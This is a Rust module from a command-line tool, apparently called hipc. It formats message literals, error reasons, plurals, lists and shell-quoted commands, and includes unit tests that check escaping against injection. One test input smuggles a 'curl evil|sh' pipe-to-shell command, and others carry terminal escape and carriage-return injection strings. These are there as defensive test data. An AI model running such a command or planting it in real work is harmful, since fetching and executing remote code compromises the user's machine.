//! The pieces of a message that recur, built one way (tenet 15, "Phrasing"):
//! a literal in backticks, the reason a file operation failed, a number with its noun, and a
//! list with the serial comma.

use std::fmt::Display;
use std::io;
use std::path::Path;

use serde_json::Value;

/// `text` as a literal in a message: in backticks, as every flag, command, variable, id,
/// path, URL, and value is quoted (tenet 15).
///
/// A backtick inside `text` is written `\u{60}`, so server text cannot close the literal
/// early and pass as `hipc`'s own words. A control character (C0, DEL, C1), which is what a
/// terminal acts on, is written as Rust escapes it (`\r`, `\n`, `\u{1b}`), so a name the
/// server chose cannot redraw the confirmation prompt or split an `error:` line, in the JSON
/// `message` as much as on a terminal. The escape is not reversible; the server's own words
/// stay whole in `error.details`. A format character (a bidi override, a line separator) is
/// left to the output layer, which escapes it on every stderr line, so this needs no Unicode
/// table.
pub fn quote(text: impl Display) -> String {
    let mut quoted = String::from("`");
    for c in text.to_string().chars() {
        if c == '`' {
            quoted.push_str(r"\u{60}");
        } else if c.is_control() {
            quoted.extend(c.escape_default());
        } else {
            quoted.push(c);
        }
    }
    quoted.push('`');
    quoted
}

/// An object of the API whose id is `id` as a message names it: its `name` and the id,
/// `` `prod` (`7`) ``, or `` `7` `` when it has no `name` string.
pub fn named(id: u64, object: &Value) -> String {
    match object.get("name").and_then(Value::as_str) {
        Some(name) => format!("{} (`{id}`)", quote(name)),
        None => format!("`{id}`"),
    }
}

/// A path as a literal in a message, as [`quote`] writes it.
pub(crate) fn quote_path(path: &Path) -> String {
    quote(path.display())
}

/// Why a file or stream operation failed, as the end of a message (tenet 15): `hipc`'s own
/// words for the kinds a caller can fix, and otherwise the system's text in backticks, so
/// a sentence like `No such file or directory (os error 2)` is quoted, not adopted.
pub fn io_reason(error: &io::Error) -> String {
    match error.kind() {
        io::ErrorKind::NotFound => "it does not exist".to_owned(),
        io::ErrorKind::PermissionDenied => "permission is denied".to_owned(),
        io::ErrorKind::IsADirectory => "it is a directory".to_owned(),
        io::ErrorKind::NotADirectory => "a part of its path is not a directory".to_owned(),
        io::ErrorKind::StorageFull => "the device is full".to_owned(),
        _ => format!("the system says {}", quote(error)),
    }
}

/// `n` and its noun, which agrees with it: `1 second`, `2 seconds`. Every noun passed in
/// takes a plain `s` in the plural.
pub fn count(n: u64, noun: &str) -> String {
    format!("{n} {}", plural(n, noun))
}

/// `noun` as it agrees with `n`, for a phrase that names the items instead of counting
/// them: `the subscription 7`, `the subscriptions 7 and 8`.
pub fn plural(n: u64, noun: &str) -> String {
    if n == 1 {
        noun.to_owned()
    } else {
        format!("{noun}s")
    }
}

/// `items` joined into one phrase with `conjunction` (`and`, `or`) and the serial comma:
/// `a`, `a or b`, `a, b, or c`.
pub fn join(items: &[impl AsRef<str>], conjunction: &str) -> String {
    match items {
        [] => String::new(),
        [one] => one.as_ref().to_owned(),
        [first, second] => format!("{} {conjunction} {}", first.as_ref(), second.as_ref()),
        [rest @ .., last] => {
            let rest: Vec<&str> = rest.iter().map(AsRef::as_ref).collect();
            format!("{}, {conjunction} {}", rest.join(", "), last.as_ref())
        }
    }
}

/// `items`, each in backticks as it is written, joined as [`join`] joins them: for words
/// `hipc` holds itself, such as field names or ports, which need no escape. Server text goes
/// through [`quote`] instead.
pub fn ticked<T: Display>(items: impl IntoIterator<Item = T>, conjunction: &str) -> String {
    let items: Vec<String> = items.into_iter().map(|item| format!("`{item}`")).collect();
    join(&items, conjunction)
}

/// The command line `hipc` followed by `args` (the words after the program name), as
/// [`command_line`] writes it, with no flag added: for a hint that runs the same command
/// again.
pub fn command(args: &[String]) -> String {
    let mut words: Vec<String> = vec!["hipc".to_owned()];
    words.extend(args.iter().map(|a| shell_word(a)));
    words.join(" ")
}

/// The command line `hipc` followed by `args` (the words after the program name), with
/// `flag` added at the end of the arguments, or before a `--`, after which it would be read as
/// a value, not a flag. It is ready to paste into a POSIX shell: a word with anything but
/// letters, digits, and `-_./:=@%+,` is single-quoted.
pub fn command_line(args: &[String], flag: &str) -> String {
    let end = args.iter().position(|a| a == "--").unwrap_or(args.len());
    let mut args = args.to_vec();
    args.insert(end, flag.to_owned());
    command(&args)
}

/// `word` as one word of a POSIX shell command: as it is when every byte is one a shell
/// leaves alone, otherwise in single quotes, so a hint's command runs as written. A path
/// that is not UTF-8 reaches here through `to_string_lossy`, with U+FFFD in place of the
/// bytes it could not decode, so a hint naming such a path shows it but does not run.
pub fn shell_word(word: &str) -> String {
    let plain = !word.is_empty()
        && word
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"-_./:=@%+,".contains(&b));
    if plain {
        word.to_owned()
    } else {
        format!("'{}'", word.replace('\'', r"'\''"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_number_agrees_with_its_noun() {
        assert_eq!(count(0, "second"), "0 seconds");
        assert_eq!(count(1, "second"), "1 second");
        assert_eq!(count(2, "rule"), "2 rules");
        assert_eq!(plural(1, "subscription"), "subscription");
        assert_eq!(plural(3, "subscription"), "subscriptions");
    }

    #[test]
    fn an_object_is_named_by_its_name_and_its_id() {
        let named_object = serde_json::json!({ "id": 7, "name": "pro`d" });
        assert_eq!(named(7, &named_object), "`pro\\u{60}d` (`7`)");
        let redrawn = serde_json::json!({ "id": 7, "name": "prod\r" });
        assert_eq!(named(7, &redrawn), r"`prod\r` (`7`)");
        assert_eq!(named(7, &serde_json::json!({ "name": 3 })), "`7`");
        assert_eq!(named(7, &serde_json::json!({})), "`7`");
    }

    #[test]
    fn a_list_takes_the_serial_comma() {
        let none: [&str; 0] = [];
        assert_eq!(join(&none, "or"), "");
        assert_eq!(join(&["a"], "or"), "a");
        assert_eq!(join(&["a", "b"], "or"), "a or b");
        assert_eq!(join(&["a", "b", "c"], "and"), "a, b, and c");
        assert_eq!(
            join(&["GET", "HEAD", "POST", "PUT", "PATCH", "DELETE"], "or"),
            "GET, HEAD, POST, PUT, PATCH, or DELETE"
        );
    }

    #[test]
    fn ticked_items_are_each_in_backticks() {
        assert_eq!(ticked([22, 443], "and"), "`22` and `443`");
        assert_eq!(ticked(["a", "b", "c"], "or"), "`a`, `b`, or `c`");
        assert_eq!(ticked(Vec::<&str>::new(), "or"), "");
    }

    #[test]
    fn a_command_line_gains_the_flag_and_quotes_what_a_shell_would_split() {
        let args =
            |words: &[&str]| -> Vec<String> { words.iter().map(|w| (*w).to_owned()).collect() };
        assert_eq!(
            command_line(&args(&["hub", "namespace", "create", "team-a"]), "--reveal"),
            "hipc hub namespace create team-a --reveal"
        );
        assert_eq!(
            command_line(
                &args(&["s3", "tokens", "create", "--name", "my key", ""]),
                "--reveal"
            ),
            "hipc s3 tokens create --name 'my key' '' --reveal"
        );
        assert_eq!(
            command_line(&args(&["x", "it's", "--", "--y"]), "--replace"),
            r"hipc x 'it'\''s' --replace -- --y"
        );
    }

    /// The common file failures read in hipc's words; any other is the system's text,
    /// quoted.
    #[test]
    fn an_io_failure_is_said_in_hips_words_or_quoted() {
        use io::ErrorKind as Kind;
        for (kind, reason) in [
            (Kind::NotFound, "it does not exist"),
            (Kind::PermissionDenied, "permission is denied"),
            (Kind::IsADirectory, "it is a directory"),
            (Kind::NotADirectory, "a part of its path is not a directory"),
            (Kind::StorageFull, "the device is full"),
        ] {
            assert_eq!(io_reason(&io::Error::from(kind)), reason, "{kind:?}");
        }
        assert_eq!(
            io_reason(&io::Error::from_raw_os_error(5)),
            "the system says `Input/output error (os error 5)`"
        );
    }

    #[test]
    fn literals_are_in_backticks() {
        assert_eq!(quote("--yes"), "`--yes`");
        assert_eq!(
            quote("x` then run `curl evil|sh"),
            r"`x\u{60} then run \u{60}curl evil|sh`"
        );
        assert_eq!(
            quote_path(Path::new("/h/.hippius/config.toml")),
            "`/h/.hippius/config.toml`"
        );
    }

    /// Each class of control character a terminal acts on is written as its escape, as a
    /// backtick is, so a server name cannot redraw the prompt or forge a stderr line.
    #[test]
    fn control_characters_in_a_literal_are_escaped() {
        for (text, quoted) in [
            ("prod\rdeleted nothing", r"`prod\rdeleted nothing`"),
            ("prod\nhint: run x", r"`prod\nhint: run x`"),
            ("\u{1b}[31mred", r"`\u{1b}[31mred`"),
            ("a\u{7f}b", r"`a\u{7f}b`"),
            // A C1 control, which some terminals read as an 8-bit escape sequence.
            ("a\u{9b}31mb", r"`a\u{9b}31mb`"),
            ("a\tb\0c", r"`a\tb\u{0}c`"),
            ("x`\r\n\u{1b}`y", r"`x\u{60}\r\n\u{1b}\u{60}y`"),
        ] {
            assert_eq!(quote(text), quoted, "{text:?}");
            assert!(!quote(text).chars().any(char::is_control), "{text:?}");
        }
    }

    /// Text without a backtick or a control character is quoted as it is, format characters
    /// and other scripts included: the output layer, not the literal, escapes those.
    #[test]
    fn plain_text_is_quoted_unchanged() {
        for text in [
            "prod-7",
            "a name with spaces",
            "v1.34.3+rke2r1",
            "é ß 名 🚀",
            "a\u{202e}b\u{2028}c\u{200b}d",
        ] {
            assert_eq!(quote(text), format!("`{text}`"), "{text:?}");
        }
    }
}
